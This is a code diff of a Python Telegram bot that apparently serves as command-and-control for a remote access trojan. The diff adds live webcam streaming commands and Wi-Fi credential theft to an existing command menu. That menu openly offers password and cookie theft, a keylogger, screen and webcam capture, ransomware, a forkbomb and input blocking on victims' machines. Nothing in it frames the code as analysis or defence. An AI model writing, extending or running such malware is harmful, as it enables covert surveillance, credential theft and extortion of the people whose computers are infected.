@@ -3,6 +3,7 @@
 # - FIXED: Added missing /list, /target, and /destroy handlers.
 # - FIXED: Improved error handling for network requests.
 # - IMPROVED: Refactored async handling within Flask for better stability.
+# - UPDATED: Added /livecam, /stoplivecam, and updated /help menu.
 #
 import os
 import re
@@ -193,7 +194,9 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         "*🔴 LIVE STREAMING*\n"
         "`/livestream` \\- Start a live screen stream\n"
-        "`/stoplivestream` \\- Stop the screen stream\n\n"
+        "`/stoplivestream` \\- Stop the screen stream\n"
+        "`/livecam` \\- Start a live webcam stream\n"
+        "`/stoplivecam` \\- Stop the webcam stream\n\n"
 
         "*🔊 AUDIO & VISUAL MISCHIEF*\n"
         "`/tts <male|female> <msg>` \\- Play Text\\-to\\-Speech\n"
@@ -211,7 +214,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         "*🔑 DATA EXFILTRATION*\n"
         "`/grab <type>` \\- Steal data \\(passwords, cookies, etc\\.\\)\n"
-        "  *Types: all, passwords, cookies, history, discord*\n\n"
+        "  *Types: all, passwords, cookies, history, discord, wifi*\n\n"
         
         "*📁 FILE SYSTEM*\n"
         "`/ls` \\- List files\n"
@@ -237,13 +240,15 @@ ptb_app.add_handler(CommandHandler("list", cmd_list_agents))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
 
+# --- UPDATED: Added new agent commands ---
 agent_commands = [
     "info", "exec", "ss", "cam", "startkeylogger", "stopkeylogger", 
-    "livestream", "stoplivestream", "grab", "ls", "cd", "download", "pwd",
+    "livestream", "stoplivestream", "livecam", "stoplivecam", # Added livecam commands
+    "grab", "ls", "cd", "download", "pwd",
     "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse",
     "forkbomb", "cancelforkbomb", "ransomware", "restore",
     "tts", "blockwebsite", "unblockwebsite", "flashscreen", "stopflashscreen",
-    "startblocker", "stopblocker", "livecam", "stoplivecam"
+    "startblocker", "stopblocker"
 ]
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
